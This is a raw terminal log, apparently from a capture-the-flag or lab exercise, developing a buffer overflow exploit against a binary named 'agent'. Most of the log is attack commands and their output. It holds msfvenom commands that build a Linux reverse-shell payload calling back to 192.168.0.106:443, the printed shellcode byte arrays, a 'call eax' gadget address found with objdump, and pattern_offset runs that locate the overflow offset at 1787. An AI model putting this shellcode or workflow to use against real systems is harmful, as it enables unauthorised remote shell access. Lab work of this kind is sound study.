msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.106 LPORT=443 -b '\x00\x0a\0xd' -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 12 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=27, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 92 (iteration=0)
x86/call4_dword_xor chosen with final size 92
Payload size: 92 bytes
Final size of c file: 413 bytes
unsigned char buf[] = 
"\x33\xc9\x83\xe9\xef\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\x51\x4a\xa0\x0c\x83\xee\xfc\xe2\xf4\x60\x91\x57\xef"
"\x02\x09\xf3\x66\x53\xc3\x41\xbc\x37\x87\x20\x9f\x08\xfa"
"\x9f\xc1\xd1\x03\xd9\xf5\x39\x8a\x08\x0c\x3b\x22\xa2\x0c"
"\x50\xf1\x29\xed\xe1\x2c\xf0\x5d\x02\xf9\xa3\x85\xb0\x87"
"\x20\x5e\x39\x24\x8f\x7f\x39\x22\x8f\x23\x33\x23\x29\xef"
"\x03\x19\x29\xed\xe1\x41\x6d\x8c";
                                                                                                                                                                                             
┌──(user㉿jakin)-[~/Documents/imf/debugging]
└─$ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
nasm > call eax
00000000  FFD0              call eax
nasm >                                                                                                                                                                                              
┌──(user㉿jakin)-[~/Documents/imf/debugging]
└─$ ls
agent  myfirstdebuginghidra.gpr  myfirstdebuginghidra.lock  myfirstdebuginghidra.lock~  myfirstdebuginghidra.rep  peda-session-agent.txt
                                                                                                                                                                                             
┌──(user㉿jakin)-[~/Documents/imf/debugging]
└─$ cp agent agentbak                     
                                                                                                                                                                                             
┌──(user㉿jakin)-[~/Documents/imf/debugging]
└─$ obdump -d agent | grep -i "FF D0"
Command 'obdump' not found, did you mean:
  command 'objdump' from deb binutils
  command 'bdump' from deb libbiniou-ocaml-dev
Try: sudo apt install <deb name>
                                                                                                                                                                                             
┌──(user㉿jakin)-[~/Documents/imf/debugging]
└─$ objdump -d agent | grep -i "FF D0"
 8048563:	ff d0                	call   *%eax
                                                                                                                                                                                             
┌──(user㉿jakin)-[~/Documents/imf/debugging]
└─$ ip a                 
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:3e:5b:f8 brd ff:ff:ff:ff:ff:ff
    inet 192.168.0.106/24 brd 192.168.0.255 scope global dynamic noprefixroute eth0
       valid_lft 66054sec preferred_lft 66054sec
    inet6 fe80::20c:29ff:fe3e:5bf8/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:bb:4b:18:4f brd ff:ff:ff:ff:ff:ff
                                                                                                                                                                                             ┌──(user㉿jakin)-[~/Documents/imf/debugging]
└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.106 LPORT=443 -b '\x00\x0a\0xd' -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 12 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
unsigned char buf[] = 
"\xd9\xeb\xbb\xb4\xf8\x75\x41\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x12\x31\x5a\x17\x03\x5a\x17\x83\x5e\x04\x97\xb4\xaf"
"\x2e\xaf\xd4\x9c\x93\x03\x71\x20\x9d\x45\x35\x42\x50\x05"
"\xa5\xd3\xda\x39\x07\x63\x53\x3f\x6e\x0b\xa4\x17\x90\xa1"
"\x4c\x6a\x91\x34\x36\xe3\x70\x86\x2e\xa4\x23\xb5\x1d\x47"
"\x4d\xd8\xaf\xc8\x1f\x72\x5e\xe6\xec\xea\xf6\xd7\x3d\x88"
"\x6f\xa1\xa1\x1e\x23\x38\xc4\x2e\xc8\xf7\x87";
                                                                                                                                                                                             
┌──(user㉿jakin)-[~/Documents/imf/debugging]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x74414156
[*] No exact matches, looking for likely candidates...
[+] Possible match at offset 571 (adjusted [ little-endian: 4322 | big-endian: 1114082 ] )
[+] Possible match at offset 574 (adjusted [ little-endian: 4066 | big-endian: 1048546 ] )
[+] Possible match at offset 577 (adjusted [ little-endian: 3810 | big-endian: 983010 ] )
[+] Possible match at offset 580 (adjusted [ little-endian: 3554 | big-endian: 917474 ] )
[+] Possible match at offset 583 (adjusted [ little-endian: 3298 | big-endian: 851938 ] )
[+] Possible match at offset 586 (adjusted [ little-endian: 3042 | big-endian: 786402 ] )
[+] Possible match at offset 589 (adjusted [ little-endian: 2786 | big-endian: 720866 ] )
[+] Possible match at offset 592 (adjusted [ little-endian: 2530 | big-endian: 655330 ] )
[+] Possible match at offset 595 (adjusted [ little-endian: 2274 | big-endian: 589794 ] )
[+] Possible match at offset 568 (adjusted [ little-endian: 2019 | big-endian: 17301474 ] )
                                                                                                                                                                                             
┌──(user㉿jakin)-[~/Documents/imf/debugging]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x74414156
                                                                                                                                                                                             
┌──(user㉿jakin)-[~/Documents/imf/debugging]
└─$ history | grep pattern
  443  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x7A46317A
  495  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
  496  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x7A46317A
  508  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
  516  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1800
  517  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x36684335
  683  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x74414156
                                                                                                                                                                                             
┌──(user㉿jakin)-[~/Documents/imf/debugging]
└─$ !517
                                                                                                                                                                                             
┌──(user㉿jakin)-[~/Documents/imf/debugging]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x36684335
[*] Exact match at offset 1787
                                                                                                                                                                                             
┌──(user㉿jakin)-[~/Documents/imf/debugging]
└─$